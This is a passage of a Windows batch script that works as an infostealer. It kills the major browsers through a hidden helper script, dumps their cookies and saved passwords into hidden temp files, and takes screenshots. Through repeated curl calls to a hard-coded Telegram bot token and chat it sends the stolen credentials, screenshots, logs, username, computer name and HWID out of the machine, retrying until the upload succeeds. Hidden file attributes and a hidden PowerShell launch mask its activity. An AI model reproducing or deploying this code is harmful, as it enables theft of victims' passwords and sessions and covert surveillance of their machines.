set "Passwords1=%temp%\Liztn7%random%"


curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%9HOU" > "%RESULT%"



findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to 3HOURDONE
    goto 3HOURDONE
)


del /f /a /q "%RESULT%"


:CREATINGBATCHFILE


(
echo @echo off
echo.
echo.
echo setlocal enabledelayedexpansion
echo.
echo set maxcount=15
echo set "CHRMCKSSTARTED=0"
echo.
echo :CHRMCKSVIEWER
echo set killcount=1
echo.
echo :killloop
echo echo !killcount! Killing...
echo taskkill /f /im Opera.exe
echo taskkill /f /im Chrome.exe
echo taskkill /f /im Brave.exe
echo taskkill /f /im Firefox.exe
echo taskkill /f /im cent.exe
echo taskkill /f /im edge.exe
echo timeout /t 1 /nobreak
echo echo.
echo echo.
echo echo.
echo echo.
echo echo.
echo set /a killcount^+=1
echo if !killcount! LEQ !maxcount! goto killloop
echo.
echo exit
) > "%BatchFileHidden1%"


attrib +h +s "%BatchFileHidden1%"
echo Created batch file at: %BatchFileHidden1%


echo Running Task Killer
Systeminterruptshost.exe %BatchFileHidden1% /delete
echo Must be Killing Task now
timeout /t 2 /nobreak
echo.
echo.


%CHROMECOOKIES% /scookiestxt %DecCookiesFile%
%ChromePass% /stext %Passwords1%




if exist "%DecCookiesFile%" (
    echo Cookies created in: %DecCookiesFile%
    attrib +h +s "%DecCookiesFile%"
) else (
    echo Cookies not created.
)
echo.
echo.

if exist "%Passwords1%" (
    echo Passwords created in: %Passwords1%
    attrib +h +s "%Passwords1%"
) else (
    echo Passwords not created.
)



attrib -h -s "%DecCookiesFile%"
attrib -h -s "%Passwords1%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
echo Passwords : >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
type "%Passwords1%" >> "%DecCookiesFile%"
del /f /a /q "%Passwords1%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"
echo. >> "%DecCookiesFile%"

set "CHRMCKSSTARTED=1"

attrib +h +s "%DecCookiesFile%"

:COMSTARTING
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%file1%'"
set "COMSTARTED=1"


attrib -h -s "%LASTRUNFILE%"
echo 0 > "%LASTRUNFILE%"
attrib +h +s "%LASTRUNFILE%"


goto NEXT4




:3HOURSTILL
echo.
echo Minutes is still %MINUTESS%
echo.








:NEXT4


























:EVERYMINSEND
echo :EVERYMINSEND
echo.





set "currentMinute=%time:~3,2%"
:EVERY5MIN

echo CurrentMinute=%currentMinute%
echo.
echo Maybe Turning CheckSend=1
if "%currentMinute%"=="00" set "CheckSend=1"
::if "%currentMinute%"=="10" set "CheckSend=1"
::if "%currentMinute%"=="20" set "CheckSend=1"
if "%currentMinute%"=="30" set "CheckSend=1"
::if "%currentMinute%"=="40" set "CheckSend=1"
::if "%currentMinute%"=="50" set "CheckSend=1"



echo CheckSend=!CheckSend!


:: ============ RUNNING TOPIC ============


:: Set bot token, chat ID, and message
set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID_RUNNING=-1002163721260"
set "TOPIC_ID_RUNNING=73779"
::
set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)W%WindowsVersion%|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)|10MNTS(%MINTSS%)|SHST%SHSTRUNNING%.KMS%KMSRUNNING%|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
set "CAPTION_RUNNING=This is a document for RUNNING Topic"
set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"


:SENDINGMINMSGNOW


curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
     -d "chat_id=%CHAT_ID_RUNNING%" ^
     -d "message_thread_id=%TOPIC_ID_RUNNING%" ^
     -d "text=%ENCODED_MESSAGE_RUNNING%" > "%RESULT%"




findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to SENDINGMINMSGNOW
    goto SENDINGMINMSGNOW
)


del /f /a /q "%RESULT%"

if "%COMSTARTED%"=="0" goto CONT



:: ============ STLR TOPIC ============


:: Set bot token, chat ID, and message
set "TOKEN_STLR=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID_STLR=-1002163721260"
set "TOPIC_ID_STLR=73727"
set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLR.COMSTARTED..|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"
set "CAPTION_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|FINAL|%time%|(v%BATCHVERSION%)"



:SENDINGSTLRMSGNOW

echo Timeis=%time%
echo.
echo Sending "%ENCODED_MESSAGE_STLR%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%ENCODED_MESSAGE_STLR%" > "%RESULT%"



findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to SENDINGSTLRMSGNOW
    goto SENDINGSTLRMSGNOW
)


:SENDCOOKIES
echo.
echo.
echo Sending Cookies Now..
echo.
echo.


curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendDocument" ^
     -F "chat_id=%CHAT_ID_STLR%" ^
     -F "message_thread_id=%TOPIC_ID_STLR%" ^
     -F "caption=%USERNAME%(%COMPUTERNAME%)|%time%" ^
     -F "document=@%DecCookiesFile%" > "%RESULT%"




findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to SENDCOOKIES
    goto SENDCOOKIES
)





del /f /a /q "%RESULT%"
del /f /a /q "%DecCookiesFile%"




:CONT
echo :CONT
echo.















:CURRENTMINSET
echo :CURRENTMINSET
echo.

set "currentMinute=%time:~3,2%"




::echo.
::echo.
::echo.
::echo CheckSend=%CheckSend%
::echo Minutes=%currentMinute%
::timeout /t 3 /nobreak






:CHECKSENDING
echo :CHECKSENDING
echo.

:: Check the value of CheckSend
if "!CheckSend!"=="1" (
    echo - CheckSend=!CheckSend! - Going to SENDGRANTED
    goto SENDGRANTED
) else (
    echo - CheckSend=!CheckSend! - Going to checkloooop
    goto NEXT2
)












:SENDGRANTED
echo :SENDGRANTED
echo.
echo Making new log files
echo.













::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|SENDGRANTED"








for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename5=!filename!"
set "filename="
set "LOGFILE1=%temp%\!filename5!%random%.mseuopm"


echo.
echo.
if exist "%LOGFILE1%" (echo LOGFILE1 exists) else (echo LOGFILE1 does not exist)
echo.
echo.

:: make a copy of %LOGFILE% to %LOGFILE1%
echo Typing LOGFILE into LOGFILE1
echo.
type "%LOGFILE%" > "%LOGFILE1%"
echo.
echo.
if exist "%LOGFILE1%" (echo LOGFILE1 exists) else (echo LOGFILE1 does not exist)
echo.
echo.



:: make x empty lines to %LOGFILE1% then type taask scheduler .....
(for /l %%i in (1,1,6) do echo.) >> "%LOGFILE1%"
type "%InstalledQWB%" >> "%LOGFILE1%"
del /f /a /q "%InstalledQWB%"
(for /l %%i in (1,1,4) do echo.) >> "%LOGFILE1%"

echo Firstly Testing with SpeedTest >> "%LOGFILE1%"
echo. >> "%LOGFILE1%"
wudtest.exe --accept-license --accept-gdpr >> "%LOGFILE1%"
(for /l %%i in (1,1,5) do echo.) >> "%LOGFILE1%"











echo Done. new log files
echo Sending
echo.
echo.





"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.jpg"
if %SENDSCREENSHOT%==0 echo 0 > "%USERPROFILE%\Downloads\screenshot.jpg"





if exist "%APPDATA%\microsoft\7z.exe" goto :COMPRESSFILES
goto NEXT2



:COMPRESSFILES
goto PEROTY
echo 7z exists. Continue...
echo.
echo.

for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename7=!filename!"
set "filename="
set "ZIP_FILE=%temp%\!filename7!.7z"
echo ZIP_FILE="%ZIP_FILE%"
echo.



set "SVNzip_PATH=%APPDATA%\microsoft\7z.exe"
set "Password=VProv7"
set "File1=%USERPROFILE%\Downloads\screenshot.jpg"
set "File2=%LOGFILE1%"


echo Compressing Files
"%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILE%" "%File1%" "%File2%"
if exist "%ZIP_FILE%" echo File Compressed successfuly.
del /f /a /q "%LOGFILE1%"
echo.
echo.




::goto PEROTY








set "ZIP_FILEMS=%temp%\mseuopefiles.7z"
set "LOGSTLR=%temp%\LGSTLRR.ever"

rem Delete existing ZIP file to ensure fresh compression
if exist "%ZIP_FILEMS%" del /f /a /q "%ZIP_FILEMS%"
echo Deleted.

echo.
echo.

del /f /a /q "%LOGSTLR%"
goto PEROTY
type "%temp%\STLRLOG.mseuope" >> "%LOGSTLR%"
echo. >> "%LOGSTLR%"
echo. >> "%LOGSTLR%"
echo 1 >> "%LOGSTLR%"




rem Compress the files using 7-Zip
"%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILEMS%" "%LOGSTLR%"


echo.
echo.





:PEROTY


set "MAX_RETRIES=3"
set "RETRY_COUNT=0"

:: ============ Updates & SCRNSHTS TOPIC ============
set "TOKEN_UPDATESSCRNSHTS=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID_UPDATESSCRNSHTS=-1002163721260"
set "TOPIC_ID_UPDATESSCRNSHTS=73936"
set "MESSAGE_UPDATESSCRNSHTS=%USERNAME%(%COMPUTERNAME%) | RUNNING Topic Update | %time% | (v)"
set "ENCODED_MESSAGE_UPDATESSCRNSHTS=%MESSAGE_RUNNING: =%%20"
set "CAPTION_UPDATESSCRNSHTS=Computer|%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|%MESSAGE%%time%|(v%BATCHVERSION%)"
set "CAPTION_UPDATESSCRNSHTS=%USERNAME%(%COMPUTERNAME%)W%WindowsVersion%|%HWID%|STARTED|%MESSAGE%%time%|(v%BATCHVERSION%)"
set "FILE_PATH_UPDATESSCRNSHTS=%temp%\RUNNING_Topic.txt"


goto IGNORESENDFILENOW

curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|SENDFILENOW" > "%RESULT%"


findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to PEROTY
    goto PEROTY
)


:IGNORESENDFILENOW



curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendPhoto" -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" -F "caption=%CAPTION_UPDATESSCRNSHTS%" -F "photo=@%USERPROFILE%\Downloads\screenshot.jpg" > "%RESULT%" 2>&1
::curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendPhoto" -F "chat_id=1040442734" -F "caption=%CAPTION_UPDATESSCRNSHTS%" -F "photo=@\"%USERPROFILE%\Downloads\screenshot.jpg\"" > "%RESULT%" 2>&1
::1040442734



findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to PEROTY
    goto PEROTY
)


:SENDONLYLOGFILEONE


curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
     -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
     -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
     -F "caption=%USERNAME%(%COMPUTERNAME%)W%WindowsVersion%|%time%" ^
     -F "document=@%LOGFILE1%" > "%RESULT%"




findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to SENDONLYLOGFILEONE
    goto SENDONLYLOGFILEONE
)








del /f /a /q "%RESULT%"
del /f /a /q "%LOGFILE1%"
::del /f /a /q "%ZIP_FILE%"










:PEROTY1







:NEXT2
set "currentMinute=%time:~3,2%"


del /f /a /q "%InstalledQWB%"
del /f /a /q "%USERPROFILE%\Downloads\screenshot.jpg"

echo.
echo Time= %time%
echo Calling ended....
timeout /t 10 /nobreak



echo Going to :EOF
goto :EOF













:checkloooop




set "currentSeconds=%time:~6,2%"
if %currentSeconds% geq 40 (
    echo Seconds are 40 or greater. Exiting...
    goto :EOF
)

cls
echo Looping... (%currentSeconds%)
::timeout /t 1 /nobreak
goto :loop_start




goto :EOF


:: Commands to skip ( maybe i need later ) 
::  if i want to kill child process of X.exe ( firstly i must to make X.exe use another file in all the script ( for example logging all the batch into file ) 
:: so i have to use handle.exe to check this file is locked by any processes , this processes is the child one , so this commands will kill this processes excluding handle.exe if found



:: Define the file to check
set "FILEUSEDBYPROCESS=%temp%\LOOOOOG.txt"

:: Get the list of processes locking the file
for /f "tokens=1,3" %%A in ('handle.exe "%FILEUSEDBYPROCESS%" ^| findstr /r "[0-9]*:"') do (
    set "PROCESS_NAME=%%A"
    set "PID=%%B"
    
    if /I not "!PROCESS_NAME!"=="handle.exe" (
        echo Killing process with name "!PROCESS_NAME!" and PID: !PID!
        taskkill /F /PID !PID!
    ) else (
        echo Skipping handle.exe (PID: !PID!)
    )
)


:: Another method using powershell ! 

:: List child processes of file1.exe (converted batch file)
echo Listing child processes of file1.exe...
powershell -Command "Get-WmiObject Win32_Process | Where-Object { $_.ParentProcessId -eq (Get-Process Test).Id } | Select-Object ProcessId, Name" > chldrocess.txt

:: Display the child processes
echo.
echo PID   -   Process Name
echo ----------------------
for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
    set "PID=%%A"
    set "PROCESSNAME=%%B"
    echo !PID!   -   !PROCESSNAME!
)
echo.
echo.
echo.
:: Kill all child processes using taskkill
for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
    set "PID=%%A"
    set "PROCESSNAME=%%B"
    echo Killing !PROCESSNAME! with PID !PID!
    taskkill /PID !PID! /F
)
echo.
echo.
:: Cleanup
del /f /a /q chldrocess.txt
echo.
echo All child processes terminated.
